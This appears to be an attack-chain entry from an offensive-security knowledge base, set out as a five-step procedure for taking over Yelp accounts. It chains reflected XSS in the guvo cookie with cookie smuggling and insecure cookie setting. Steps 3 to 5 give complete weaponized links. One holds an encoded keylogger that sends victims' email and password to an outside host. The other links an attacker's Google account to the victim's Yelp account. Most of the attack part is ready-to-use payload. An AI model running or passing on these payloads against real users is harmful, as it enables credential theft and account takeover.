---
tags:
  - xss
  - cookie-smuggling
  - keylogger
  - account-takeover
  - cookie-parsing
type: attack_chain
tools:
  - '[[tools/Burp]]'
  - '[[tools/CyberChef]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
  - '[[Initial Access]]'
commands:
  - '[[commands/set-yelpmainpaastacanary-cookie]]'
  - '[[commands/standard-cookie-header]]'
  - '[[commands/broken-cookie-header]]'
  - '[[commands/set-smuggled-guvo-cookie-xss]]'
  - '[[commands/set-smuggled-cookie-response]]'
  - '[[commands/set-persistent-smuggled-cookie]]'
  - '[[commands/set-persistent-smuggled-cookie-response]]'
  - '[[commands/javascript-keylogger-payload]]'
  - '[[commands/cyberchef-keylogger-recipe]]'
  - '[[commands/final-keylogger-link]]'
  - '[[commands/javascript-ato-payload]]'
  - '[[commands/cyberchef-ato-recipe]]'
  - '[[commands/final-ato-link]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Discover-Reflected-XSS-in-Guvo-Cookie]]'
  - '[[procedures/Identify-Insecure-Cookie-Setting-via-Query-Parameter]]'
  - '[[procedures/Exploit-Broken-Cookie-Parsing-for-Smuggling]]'
  - '[[procedures/Inject-Keylogger-Payload-via-Smuggled-XSS]]'
  - '[[procedures/Perform-Account-Takeover-via-Google-Linking-XSS]]'
step_count: 5
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
  - '[[Valid Accounts]]'
description: >-
  Multi-stage attack exploiting reflected XSS in guvo cookie, cookie smuggling
  via broken parsing, and insecure cookie setting to inject keyloggers and
  perform account takeovers on Yelp.
skill_level: intermediate
impact_level: high
id: 6f45039c-ce6b-41dd-80e3-36123841827d
created_at: '2025-12-13T23:56:20.381Z'
updated_at: '2025-12-13T23:56:20.381Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
  - '[[Valid Accounts]]'
---
# Chained XSS and Cookie Smuggling for Yelp Account Takeover via Keylogger and Google Linking

Multi-stage attack chain demonstrating a complete attack workflow exploiting reflected XSS in the guvo cookie on Yelp pages, combined with broken cookie parsing and insecure cookie setting to smuggle payloads, inject keyloggers for credential theft, and perform account takeovers by linking attacker Google accounts.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discover XSS] --> B[Identify Cookie Setting]
    B --> C[Exploit Smuggling]
    C --> D[Inject Keylogger]
    D --> E[Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#2c3e50
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp]]
- [[tools/CyberChef]]

### Target Environment

- Web platform
- Yelp web application services
- Google Connect integration

### Initial Access Requirements

- Access to Yelp.com domains
- Ability to set cookies via browser or proxy
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Discover Reflected XSS in Guvo Cookie
procedure: [[procedures/Discover-Reflected-XSS-in-Guvo-Cookie]]

**Objective**: Identify the reflected XSS vulnerability in the guvo cookie value on Yelp pages.

**Instructions**: Use [[tools/Burp]] to set the guvo cookie and observe unescaped reflection in HTML responses. Intercept requests to pages like www.yelp.com and biz.yelp.com/login, and check for reflection in window.ySitRepParams and window.yelp.guv.

**Expected Output**: Observation of unescaped guvo value in page source, confirming XSS potential.

**Success Indicators**:
- Guvo value reflected without escaping
- Ability to inject test scripts like alert(1)

### Step 2: Identify Insecure Cookie Setting via Query Parameter
procedure: [[procedures/Identify-Insecure-Cookie-Setting-via-Query-Parameter]]

**Objective**: Discover the mechanism to set cookies arbitrarily via URL query parameters.

**Instructions**: Send a request using [[commands/set-yelpmainpaastacanary-cookie]] by appending ?canary=asdf to https://www.yelp.com/. Observe the Set-Cookie header in the response.

```bash
https://www.yelp.com/?canary=asdf
```

**Expected Output**: yelpmainpaastacanary cookie set with the provided value.

**Success Indicators**:
- Cookie successfully set via query parameter
- Persistence across requests

### Step 3: Exploit Broken Cookie Parsing for Smuggling
procedure: [[procedures/Exploit-Broken-Cookie-Parsing-for-Smuggling]]

**Objective**: Smuggle additional cookies like guvo inside another cookie by exploiting space-based parsing.

**Instructions**: Use [[commands/set-smuggled-guvo-cookie-xss]] to smuggle an XSS payload: https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E. Add persistence with [[commands/set-persistent-smuggled-cookie]]: https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999.

```bash
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999
```

**Expected Output**: Smuggled guvo cookie set, triggering XSS alert on page load.

**Success Indicators**:
- Cookie smuggling successful
- XSS payload executes persistently

### Step 4: Inject Keylogger Payload via Smuggled XSS
procedure: [[procedures/Inject-Keylogger-Payload-via-Smuggled-XSS]]

**Objective**: Inject a JavaScript keylogger on the login page to steal credentials.

**Instructions**: Use [[tools/CyberChef]] with [[commands/cyberchef-keylogger-recipe]] to generate the payload. Then, have the victim visit [[commands/final-keylogger-link]]: https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999.

```bash
https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
```

**Expected Output**: Keylogger installed, exfiltrating email and password to attacker's domain.

**Success Indicators**:
- Credentials captured on login attempts
- Data received at exfiltration endpoint

### Step 5: Perform Account Takeover via Google Linking XSS
procedure: [[procedures/Perform-Account-Takeover-via-Google-Linking-XSS]]

**Objective**: Use XSS to link attacker's Google account to victim's Yelp account.

**Instructions**: Intercept id_token from your own Google linking, then use [[tools/CyberChef]] with [[commands/cyberchef-ato-recipe]] to generate the payload. Have victim visit [[commands/final-ato-link]]: https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27YT1uZXcgWE1MSHR0cFJlcXVlc3QsYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoZnVuY3Rpb24oKXtyeD0vIkdvb2dsZUNvbm5lY3QiOiAiKFjeIl0qKS8saWRfdG9rZW49ImV5SmhiR2NpT2lKU1V6STFOaUlzSW10cFpDSTZJall3T0ROa1pEVTVPREUyTnpObU5qWXhabVJsT1dSaFpUWTBObUkyWmpBek9EQmhNREUwTldNaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpwYzNNaU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5SekxtZHZiMmRzWlM1amIyMGlMQ0p1WW1ZaU9qRTJPRFUzTVRBeE5qRXNJbUYxWkNJNklqWTVPVFk1TVRnNU5UY3hNUzEyYlRKck9HVm5Zak15TjJoeE0yd3dZVGRqY25OcU1HOHliemxzWlc0Mk1TNWhjSEJ6TG1kdmIyZHNaWFZ6WlhKamIyNTBaVzUwTG1OdmJTSXNJbk4xWWlJNklqRXdOREEwTVRBMU16a3lNalE1TkRZM01qRXhOeUlzSW1WdFlXbHNJam9pWkc5dlpHRmtkV2QxWTBCbmJXRnBiQzVqYjIwaUxDSmxiV0ZwYkY5MlpYSnBabWxsWkNJNmRISjFaU3dpWVhwd0lqb2lOams1TmpreE9EazFOekV4TFhadE1tczRaV2RpTXpJM2FIRXpiREJoTjJOeWMyb3diekp2T1d4bGJqWXhMbUZ3Y0hNdVoyOXZaMnhsZFhObGNtTnZiblJsYm5RdVkyOXRJaXdpYm1GdFpTSTZJa1JoWkdVZ1RYVnljR2g1SWl3aWNHbGpkSFZ5WlNJNkltaDBkSEJ6T2k4dmJHZ3pMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlM5aEwwRkJZMGhVZEdaR1ZsUkZTVTVmYzNWVlYwMUNUbXBqU0dGRVdIZzNUREpsYkhGUU1UVndOR2hMYWtzeFBYTTVOaTFqSWl3aVoybDJaVzVmYm1GdFpTSTZJa1JoWkdVaUxDSm1ZVzFwYkhsZmJtRnRaU0k2SWsxMWNuQm9lU0lzSW1saGRDSTZNVFk0TlRjeE1EUTJNU3dpWlhod0lqb3hOamcxTnpFME1EWXhMQ0pxZEdraU9pSm1Oell5WkRabFpqRXlabUZrTmpJNVltRTRZVFk1T0dGaE1ETmhNR00zTnpVNE16WXdZV1V4SW4wLkstWGNhQUJWaFV2LVdtY3BITENFYURrNXJlWVdIMDdBYjFRa1V4aGFHYk5RWXp0MTRWaVBtMnliaUlnSlVLaHl1d0p6ekFqbGxKdnRyVjJfTnJVWm5RMHZBX3Y3UHVLTzlHUVZoNzJuWXg1c1duNkxqTXN1V0xoNWQyNFZrLVJ5MUNxQ194czJqRWVoMDNlbXNaLTFHaGFfLUFCd2xiQ0RINXlxZWVwTmtoMkVhWVo3Y0tWc1VVeG5JanBYS3JPN3hTN3pQN2FCeXQwbUhBMWdVU2VpLTRhYWxfUFZLNHpJR2EyR3l2TENUUTNmcXNlRHo3RkNyUVlPLTNILVZLOU8yTmlCWVpjemJ6X3ZMb1JRdEFTZVJnYmo1alFVdEVEamZ6SzhNVFZndldQVmozRVp2dDRCYmQwY3Bfb0ZtcEwxV2pNeUI5bVR0T0tCU00zRGFXZExOZyIsYj1yeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KSxmZXRjaCgiaHR0cHM6Ly93d3cueWVscC5kay9nb29nbGVfY29ubmVjdC9yZWdpc3RlciIse21ldGhvZDoiUE9TVCIsYm9keTpuZXcgVVJMU2VhcmNoUGFyYW1zKHtpZF90b2tlbjppZF90b2tlbixjc3JmdG9rOmJbMV19KX0pfSkpLGEub3BlbigiR0VUIiwiaHR0cHM6Ly93d3cueWVscC5kay9wcm9maWxlX3NoYXJpbmciKSxhLnNlbmQoKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999.

```bash
https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27YT1uZXcgWE1MSHR0cFJlcXVlc3QsYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoZnVuY3Rpb24oKXtyeD0vIkdvb2dsZUNvbm5lY3QiOiAiKFjeIl0qKS8saWRfdG9rZW49ImV5SmhiR2NpT2lKU1V6STFOaUlzSW10cFpDSTZJall3T0ROa1pEVTVPREUyTnpObU5qWXhabVJsT1dSaFpUWTBObUkyWmpBek9EQmhNREUwTldNaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpwYzNNaU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5SekxtZHZiMmRzWlM1amIyMGlMQ0p1WW1ZaU9qRTJPRFUzTVRBeE5qRXNJbUYxWkNJNklqWTVPVFk1TVRnNU5UY3hNUzEyYlRKck9HVm5Zak15TjJoeE0yd3dZVGRqY25OcU1HOHliemxzWlc0Mk1TNWhjSEJ6TG1kdmIyZHNaWFZ6WlhKamIyNTBaVzUwTG1OdmJTSXNJbk4xWWlJNklqRXdOREEwTVRBMU16a3lNalE1TkRZM01qRXhOeUlzSW1WdFlXbHNJam9pWkc5dlpHRmtkV2QxWTBCbmJXRnBiQzVqYjIwaUxDSmxiV0ZwYkY5MlpYSnBabWxsWkNJNmRISjFaU3dpWVhwd0lqb2lOams1TmpreE9EazFOekV4TFhadE1tczRaV2RpTXpJM2FIRXpiREJoTjJOeWMyb3diekp2T1d4bGJqWXhMbUZ3Y0hNdVoyOXZaMnhsZFhObGNtTnZiblJsYm5RdVkyOXRJaXdpYm1GdFpTSTZJa1JoWkdVZ1RYVnljR2g1SWl3aWNHbGpkSFZ5WlNJNkltaDBkSEJ6T2k4dmJHZ3pMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlM5aEwwRkJZMGhVZEdaR1ZsUkZTVTVmYzNWVlYwMUNUbXBqU0dGRVdIZzNUREpsYkhGUU1UVndOR2hMYWtzeFBYTTVOaTFqSWl3aVoybDJaVzVmYm1GdFpTSTZJa1JoWkdVaUxDSm1ZVzFwYkhsZmJtRnRaU0k2SWsxMWNuQm9lU0lzSW1saGRDSTZNVFk0TlRjeE1EUTJNU3dpWlhod0lqb3hOamcxTnpFME1EWXhMQ0pxZEdraU9pSm1Oell5WkRabFpqRXlabUZrTmpJNVltRTRZVFk1T0dGaE1ETmhNR00zTnpVNE16WXdZV1V4SW4wLkstWGNhQUJWaFV2LVdtY3BITENFYURrNXJlWVdIMDdBYjFRa1V4aGFHYk5RWXp0MTRWaVBtMnliaUlnSlVLaHl1d0p6ekFqbGxKdnRyVjJfTnJVWm5RMHZBX3Y3UHVLTzlHUVZoNzJuWXg1c1duNkxqTXN1V0xoNWQyNFZrLVJ5MUNxQ194czJqRWVoMDNlbXNaLTFHaGFfLUFCd2xiQ0RINXlxZWVwTmtoMkVhWVo3Y0tWc1VVeG5JanBYS3JPN3hTN3pQN2FCeXQwbUhBMWdVU2VpLTRhYWxfUFZLNHpJR2EyR3l2TENUUTNmcXNlRHo3RkNyUVlPLTNILVZLOU8yTmlCWVpjemJ6X3ZMb1JRdEFTZVJnYmo1alFVdEVEamZ6SzhNVFZndldQVmozRVp2dDRCYmQwY3Bfb0ZtcEwxV2pNeUI5bVR0T0tCU00zRGFXZExOZyIsYj1yeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KSxmZXRjaCgiaHR0cHM6Ly93d3cueWVscC5kay9nb29nbGVfY29ubmVjdC9yZWdpc3RlciIse21ldGhvZDoiUE9TVCIsYm9keTpuZXcgVVJMU2VhcmNoUGFyYW1zKHtpZF90b2tlbjppZF90b2tlbixjc3JmdG9rOmJbMV19KX0pfSkpLGEub3BlbigiR0VUIiwiaHR0cHM6Ly93d3cueWVscC5kay9wcm9maWxlX3NoYXJpbmciKSxhLnNlbmQoKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
```

**Expected Output**: Attacker's Google account linked to victim's Yelp account.

**Success Indicators**:
- Successful POST to /google_connect/register
- Account takeover confirmed by login

## Attack Chain Summary

### Key Achievements

1. Discovery of XSS and smuggling vulnerabilities
2. Credential theft via keylogger
3. Full account takeover via Google linking

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]
- [[Valid Accounts]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]
- [[Initial Access]]

*Last updated: [TIMESTAMP]*
